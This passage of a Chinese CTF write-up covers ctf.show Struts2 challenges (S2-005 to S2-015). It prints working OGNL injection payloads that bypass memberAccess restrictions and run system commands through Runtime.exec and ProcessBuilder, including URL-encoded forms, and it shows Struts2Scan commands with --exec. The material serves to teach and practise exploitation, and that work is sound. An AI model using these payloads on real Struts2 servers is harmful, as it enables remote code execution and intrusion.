+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),</span><br><span class="line">#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),</span><br><span class="line">#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),</span><br><span class="line">#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ognl表达式"><a href="#Ognl表达式" class="headerlink" title="Ognl表达式"></a>Ognl表达式</h3><blockquote>
+<p>Object-Graph Navigation Language (OGNL) 是一个强大的表达式语言（Expression Language，EL），用于获取和设置 Java 对象的属性。<strong>在Apache Struts 2框架中，OGNL用于数据传输、执行方法和表达式求值。</strong>它允许开发人员在XML配置文件或Struts 2框架的各种部分中，通过字符串形式的表达式访问和操作数据模型（data model）。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">Ognl 的基本语法</a></p>
+<p>解析这段内容：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),</span><br></pre></td></tr></table></figure>
+<p><code>%&#123;&#125;</code>：在Apache Struts2中，<code>%&#123;&#125;</code>时指定处理字符串时，将内部的字符串当作OGNL表达式执行。</p>
+<p><code>#a</code>：使用OGNL时如果不设置上下文对象，系统会自动创建一个上下文对象；如果传入的参数中包含了上下文对象则会使用传入的上下文对象。当访问上下文对象中的参数时，需要在表达式前面加上<code>#</code>，表示了与访问<code>root</code>对象的区别。</p>
+<p>此处，创建了一个参数<code>#a</code>，将其赋值为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start()</span><br></pre></td></tr></table></figure>
+
+<p><code>ProcessBuilder()</code>创建了一个<code>ProcessBuilder</code>对象，因该对象构造函数接收字符串数组作为参数，所以创建一个字符串数组参数<code>java.lang.String[]&#123;&quot;env&quot;&#125;</code>，这是一个字符串数组，第一个参数是”env”。如果需要执行<code>ls -a</code>，改为<code>java.lang.String[]&#123;&quot;ls&quot;,&quot;-a&quot;&#125;</code>即可。</p>
+<p>接下来，<code>.redirectErrorStream(true)</code>将标准错误流合并到标准输出流中。<code>true</code>参数表示启用重定向。最后，调用<code>.start()</code>方法，启动执行<code>env</code>命令的进程。该方法返回一个<code>Process</code>对象。这个对象被赋给了<code>#a</code>，后续就可以通过这个引用来控制这个进程。</p>
+<p>OGNL中，逗号<code>,</code>是分隔符。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#b=#a.getInputStream(),</span><br></pre></td></tr></table></figure>
+
+<p>这句将<code>#a.getInputStream()</code>调用获取了与这个进程的标准输出流相连的输入流。<code>getInputStream()</code>用来读取由进程生成的输出。它可以这样理解：Java通过<code>InputStream</code>输入内容，我们读取这个输入，就是将这个输入看作输出。最后将这个输入流对象赋给了<code>#b</code>，以通过调用<code>#b</code>操作这个输入流。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),</span><br><span class="line">#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),</span><br><span class="line">#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],</span><br><span class="line">#d.read(#e),</span><br></pre></td></tr></table></figure>
+
+<p>创建了一个<code>InputStreamReader</code>实例，它是一个桥梁，能够将字节流（InputStream）转换为字符流（Reader）。<code>InputStreamReader</code>读取字节流，并将其解码为字符流，便于后续处理文本数据。这里，<code>#c</code>被赋值为这个<code>InputStreamReader</code>对象。</p>
+<p><code>new java.io.BufferedReader(#c)</code>创建了一个<code>BufferedReader</code>实例，这是一个包装了任意<code>Reader</code>（如<code>InputStreamReader</code>）的缓冲字符输入流。缓冲意味着每次从底层输入流读取时，可以从内存中的缓冲区读取，减少了实际的I&#x2F;O操作次数，从而提高了读取效率。<code>#d</code>被赋值为这个<code>BufferedReader</code>对象。</p>
+<p>之后创建了一个长度为50000的缓冲区，赋给了<code>#e</code>。<code>#d</code>是<code>BufferedReader</code>的实例，<code>read(#e)</code>方法从<code>BufferedReader</code>中读取字符到<code>#e</code>指定的字符数组中。这个方法尝试读取字符数组长度的字符填充数组，返回值是实际读取的字符数量。如果流的末尾已到达，则返回-1。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),</span><br><span class="line">#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br></pre></td></tr></table></figure>
+<p>在Struts2中，<code>#context</code>是一个OGNL表达式的上下文对象，它提供了访问当前执行环境的方法，<code>#context.get()</code>这个方法就能获取各种环境和请求相关的对象。<code>com.opensymphony.xwork2.dispatcher.HttpServletResponse</code>可从上下文中获取<code>HttpServletResponse</code>对象。该对象用于构造和发送HTTP响应给客户端。在这里，这个对象被储存在了<code>#f</code>。</p>
+<p><code>#f.getWriter()</code>调用<code>HttpServletResponse</code>对象的<code>getWriter()</code>方法，返回一个可以向字符串发送字符文本响应的<code>PrintWriter</code>对象。在这里将<code>#e</code>储存的字符数组创建一个新字符串并print出来。<code>.flush()</code>方法用来确保所有缓冲的输出数据被真正发送到客户端。在字符流中，<code>flush()</code>方法用于清空缓冲区，立即将所有待发送的输出数据写入底层流。最后<code>close()</code>关闭流。</p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/@abhishekY495/rce-via-apache-struts2-still-out-there-b15ce205aa21">判断站点是否使用Struts2，并进行RCE测试</a></p>
+<h2 id="web280-S2-005"><a href="#web280-S2-005" class="headerlink" title="web280 - S2-005"></a>web280 - S2-005</h2><p>点进来有提示：“S2-005”</p>
+<blockquote>
+<p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开</p>
+</blockquote>
+<p>从<a target="_blank" rel="noopener" href="https://www.cnblogs.com/blankunbeaten/p/14826753.html">S2-005解释</a>那里偷了个PoC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/EDI%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
+<p>注：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\u0023 ==&gt; #</span><br><span class="line">\u003d ==&gt; =</span><br></pre></td></tr></table></figure>
+<p>该PoC是运行<code>touch /tmp/EDI</code>的。<code>#rt.exec(&quot;touch@/tmp/EDI&quot;.split(&quot;@&quot;)</code></p>
+<p>给它修改为<code>&quot;ls@-a&quot;</code>。没用，这个PoC是无回显的。</p>
+<p>还有另一个PoC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27id%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p>该PoC运行命令<code>id</code>。甚至网页出错了，换成<code>ls</code>，还是没有额外的内容。</p>
+<p>直接复现，复现失败。之后会尝试换成反弹shell。</p>
+<p>从<a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">Struts2Scan工具</a>使用了Struts2漏洞扫描，发现存在S2-016漏洞，直接运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://2afa6b1f-078a-4ad3-9ff2-b70eba415a8d.challenge.ctf.show/S2-005/example/HelloWorld.action -n <span class="string">&quot;S2-016&quot;</span> --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+<p>获得了shell。直接<code>env</code>显示环境变量即可。</p>
+<p>当然，也可以运行S2-005的PoC，也能拿shell。</p>
+<h2 id="web281-S2-007"><a href="#web281-S2-007" class="headerlink" title="web281 - S2-007"></a>web281 - S2-007</h2><p>得到提示，“S2-007”。</p>
+<blockquote>
+<p>S2-007的漏洞原理是在处理类型转换的错误时会存入错误到内存中，在后续调用流程中触发OGNL表达式注入。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">Struts2Scan工具</a>直接扫，没有发现S2-007的漏洞，但是又扫出了S2-016的洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://da0f9ec3-d312-4bfe-82fa-e361189c8068.challenge.ctf.show/S2-007/user.action -n &quot;S2-016&quot; -d &quot;age=&#123;exp&#125;&amp;email=123&amp;name=321&quot; --exec</span><br></pre></td></tr></table></figure>
+<p>可以用工具获得shell。但这个题是S2-007的洞，就尝试手动。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Struts2%20S2-007%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md">这篇内容</a>对S2-007进行了解释</p>
+<blockquote>
+<p>当配置了验证规则 &lt;ActionName&gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line">public class UserAction extends ActionSupport &#123;</span><br><span class="line">    private Integer age;</span><br><span class="line">    private String name;</span><br><span class="line">    private String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>然后配置有 UserAction-validation.xml：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE validators PUBLIC</span><br><span class="line">    &quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span><br><span class="line">    &quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;&gt;</span><br><span class="line">&lt;validators&gt;</span><br><span class="line">    &lt;field name=&quot;age&quot;&gt;</span><br><span class="line">        &lt;field-validator type=&quot;int&quot;&gt;</span><br><span class="line">            &lt;param name=&quot;min&quot;&gt;1&lt;/param&gt;</span><br><span class="line">            &lt;param name=&quot;max&quot;&gt;150&lt;/param&gt;</span><br><span class="line">        &lt;/field-validator&gt;</span><br><span class="line">    &lt;/field&gt;</span><br><span class="line">&lt;/validators&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 “‘“ + value + “‘“ 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
+</blockquote>
+<h3 id="判断S2-007"><a href="#判断S2-007" class="headerlink" title="判断S2-007"></a>判断S2-007</h3><p>向<code>age</code>字段传入<code>%27%2B(%23application)%2B%27</code>，根据回显确认有S2-007漏洞。</p>
+<p>从<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_47493074/article/details/127114985">这里</a>偷了个任意命令执行的payload，需要执行的指令是下面payload中的<code>ls /</code>，将其替换即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+++(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new+java.lang.Boolean(&quot;false&quot;)+,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;ls /&#x27;).getInputStream()))+++&#x27;</span><br></pre></td></tr></table></figure>
+<p>URL编码后是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure>
+<p>修改payload中的命令即可。</p>
+<h3 id="解析payload"><a href="#解析payload" class="headerlink" title="解析payload"></a>解析payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+++</span></span><br><span class="line"><span class="string">(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,</span></span><br><span class="line"><span class="string">#foo=new+java.lang.Boolean(&quot;false&quot;)+,</span></span><br><span class="line"><span class="string">#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,</span></span><br><span class="line"><span class="string">@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>ls /<span class="string">&#x27;).getInputStream()))</span></span><br><span class="line"><span class="string">+++&#x27;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><code>+++(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,</code>通过修改<code>#_memberAccess</code>的<code>allowStaticMethodAccess</code>属性为true以允许访问静态方法。在Struts2中，<code>#_memberAccess</code>用于控制对对象成员的访问权限，将其设为true可以绕过安全措施执行静态方法。</li>
+<li><code>#foo=new+java.lang.Boolean(&quot;false&quot;)+</code>声明了一个全局变量<code>foo</code>，并将其初始化为false，用于之后的关闭方法执行的权限检查。</li>
+<li><code>#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,</code>把方法上下文中的<code>xwork.MethodAccessor.denyMethodExecution</code>设定为<code>#foo</code>，禁用了方法执行的拒绝权限检查。在默认情况下，Struts 2会阻止未授权的方法执行来增强安全性，但这个设置被修改后，这层安全防护被绕过。</li>
+<li><code>@org.apache.commons.io.IOUtils@toString(</code>使用Apache Commons IO库中的<code>IOUtils</code>类的<code>toString</code>静态方法，这个方法用于将InputStream的内容转换成字符串。</li>
+<li><code>@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream()</code>通过Java的<code>Runtime</code>类执行系统命令<code>env</code>，该命令用于列出所有环境变量。然后，通过<code>getInputStream()</code>获取命令执行的输出流。</li>
+<li><code>))+++</code>结束OGNL表达式，余下的+++可能用于确保payload的其余部分不干扰解析，或仅仅是作为分隔符。</li>
+</ol>
+<p>注：</p>
+<ul>
+<li>OGNL表达式中可以加空格，也就是，<code>#a = 10, #b = #a * 2</code>和<code>#a=10,#b=#a*2</code>是等效的。</li>
+<li>在OGNL（Object-Graph Navigation Language）表达式中，<code>@</code>符号用于访问Java类的静态成员，包括静态方法和静态字段。这种语法允许在不创建类实例的情况下直接调用静态方法或访问静态字段。</li>
+<li>类似<code>@类名@方法名(参数)</code>的表达式表示正在直接调用该类的静态方法。比如，<code>@java.lang.Integer@MAX_VALUE</code>访问了<code>java.lang.Integer</code>类的<code>MAX_VALUE</code>静态字段，它存储了int类型可以表示的最大值。</li>
+</ul>
+<h3 id="什么是-？"><a href="#什么是-？" class="headerlink" title="什么是@？"></a>什么是<code>@</code>？</h3><p>在一般的Java代码中，<code>@</code>符号主要用于两个场景：注解（Annotations）和lambda表达式的类型注解。</p>
+<h4 id="注解（Annotations）"><a href="#注解（Annotations）" class="headerlink" title="注解（Annotations）"></a>注解（Annotations）</h4><p>注解是Java 5引入的一个特性，它提供了一种为代码添加元数据（即数据关于数据的数据）的方法。通过使用注解，开发者可以在不改变原有逻辑的情况下，为代码添加额外的信息。注解可以应用于声明：类、方法、变量、参数等，以及Java包。使用@符号后跟注解名来声明注解。</p>
+<p>用途包括但不限于：</p>
+<ul>
+<li><p>编译检查：例如<code>@Override</code>注解告诉编译器该方法必须覆盖父类方法。如果父类中没有这个方法，编译器将报错。</p>
+</li>
+<li><p>编译时和部署时处理：一些工具和框架在编译时或部署时会处理特定的注解，例如用<code>@Entity</code>标记实体类，在ORM框架中映射到数据库表。</p>
+</li>
+<li><p>运行时处理：一些注解可用于运行时反射，以获取关于类、方法或字段的信息，例如JUnit框架使用<code>@Test</code>标记单元测试方法。</p>
+</li>
+</ul>
+<h4 id="用于Lambda表达式"><a href="#用于Lambda表达式" class="headerlink" title="@用于Lambda表达式"></a><code>@</code>用于Lambda表达式</h4><p>Java 8引入了lambda表达式，进一步增强了Java的表达力。在这个上下文中，<code>@</code>符号可以用于类型注解，这是Java 8的另一个特性。类型注解允许你在任何使用类型的地方应用注解，包括泛型类型、类型强制转换、implements子句和throws子句等。</p>
+<p>虽然类型注解的使用不限于lambda表达式，但在lambda表达式的参数中使用类型注解是@符号的又一个用途。</p>
+<p>如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="meta">@NonNull</span> String s) -&gt; s.length()</span><br></pre></td></tr></table></figure>
+<p>这里，<code>@NonNull</code>可以是一个类型注解，表示lambda表达式的参数<code>String s</code>不应为null。</p>
+<h4 id="什么是Java-Lambda表达式？"><a href="#什么是Java-Lambda表达式？" class="headerlink" title="什么是Java Lambda表达式？"></a>什么是Java Lambda表达式？</h4><p>Java中的Lambda表达式是一种简洁的表示匿名方法（即没有名称的方法）的方式，它引入了一个清晰而简洁的方式来实现仅有单一方法的接口（称为功能接口）。Lambda表达式是Java 8中引入的一个重要特性，旨在提供一种简洁的方法来表示实例化单方法接口的实现，从而使代码更加简洁易读，特别是在使用函数式编程风格时。</p>
+<p>Lambda表达式的基本形式如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(parameters) -&gt; expression</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(parameters) -&gt; &#123; statements; &#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>参数(parameters)：可以是一个参数，多个参数，或者无参数，类似于传统方法定义中的参数列表。参数类型可以显式声明，也可以由编译器自动从上下文推断。</p>
+</li>
+<li><p>箭头操作符（-&gt;）：用于分隔参数和表达式或代码块。</p>
+</li>
+<li><p>表达式或代码块(expression&#x2F;statements)：如果Lambda表达式需要执行多条语句，可以使用花括号（{}）将这些语句包围起来形成代码块。如果Lambda表达式仅包含单一表达式，其返回值会自动返回给调用者（无需显式使用return语句）。</p>
+</li>
+</ul>
+<p>示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无参数的Lambda表达式</span></span><br><span class="line">() -&gt; System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单个参数的Lambda表达式</span></span><br><span class="line">(String s) -&gt; System.out.println(s);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个参数的Lambda表达式</span></span><br><span class="line">(<span class="type">int</span> a, <span class="type">int</span> b) -&gt; a + b;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用代码块的Lambda表达式</span></span><br><span class="line">(String s) -&gt; &#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">    System.out.println(<span class="string">&quot;Lambda expressions are powerful!&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>一个定义到使用lambda函数式接口的示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MathOperation</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">operation</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LambdaExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用Lambda表达式定义了对MathOperation接口的实现</span></span><br><span class="line">        <span class="type">MathOperation</span> <span class="variable">addition</span> <span class="operator">=</span> (<span class="type">int</span> a, <span class="type">int</span> b) -&gt; a + b;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用Lambda表达式</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> addition.operation(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;10 + 5 = &quot;</span> + result);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 更多示例</span></span><br><span class="line">        <span class="type">MathOperation</span> <span class="variable">subtraction</span> <span class="operator">=</span> (a, b) -&gt; a - b; <span class="comment">// 参数类型可以省略</span></span><br><span class="line">        System.out.println(<span class="string">&quot;10 - 5 = &quot;</span> + subtraction.operation(<span class="number">10</span>, <span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web282-S2-008"><a href="#web282-S2-008" class="headerlink" title="web282 - S2-008"></a>web282 - S2-008</h2><p>S2-008有<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md">两种利用姿势</a>：</p>
+<ul>
+<li>Cookie 拦截器错误配置可造成 OGNL 表达式执行</li>
+<li>struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令</li>
+</ul>
+<p>直接上工具：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://6338fedd-409f-4924-8fbb-273c3aac4b85.challenge.ctf.show/S2-008/cookie.action -n <span class="string">&quot;S2-008&quot;</span> --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://6338fedd-409f-4924-8fbb-273c3aac4b85.challenge.ctf.show/S2-008/devmode.action -n <span class="string">&quot;S2-008&quot;</span> --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web283-S2-009"><a href="#web283-S2-009" class="headerlink" title="web283 - S2-009"></a>web283 - S2-009</h2><p>S2-009的<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-009/README.zh-cn.md">利用</a>是需要找一个接受了参数，参数类型是string的action。</p>
+<p>直接上工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://2de0a1d2-138e-4f7b-bbcc-1f20d708c1a8.challenge.ctf.show/S2-009/ajax/example5.action</span><br></pre></td></tr></table></figure>
+
+<h2 id="web284-S2-012"><a href="#web284-S2-012" class="headerlink" title="web284 - S2-012"></a>web284 - S2-012</h2><p>S2-012的<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-012/README.zh-cn.md">利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7083293238315974687#heading-5">wp</a></p>
+<p>可直接用S2-001的PoC。但是我尝试用工具，失败了。</p>
+<h2 id="web285-S2-013-S2-014"><a href="#web285-S2-013-S2-014" class="headerlink" title="web285 - S2-013&#x2F;S2-014"></a>web285 - S2-013&#x2F;S2-014</h2><p>S2-013&#x2F;S2-014<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md">原理及利用</a></p>
+<p>全部都是OGNL渲染的问题。</p>
+<p>直接上工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://f1885971-b441-436a-82fa-2889e66efd38.challenge.ctf.show/S2-013/link.action -n S2-013 -e</span><br></pre></td></tr></table></figure>
+
+<h2 id="web286-S2-015"><a href="#web286-S2-015" class="headerlink" title="web286 - S2-015"></a>web286 - S2-015</h2><p>S2-015<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-015/README.zh-cn.md">原理及利用</a></p>
+<p>在struts.xml中，存在如下配置漏洞：</p>
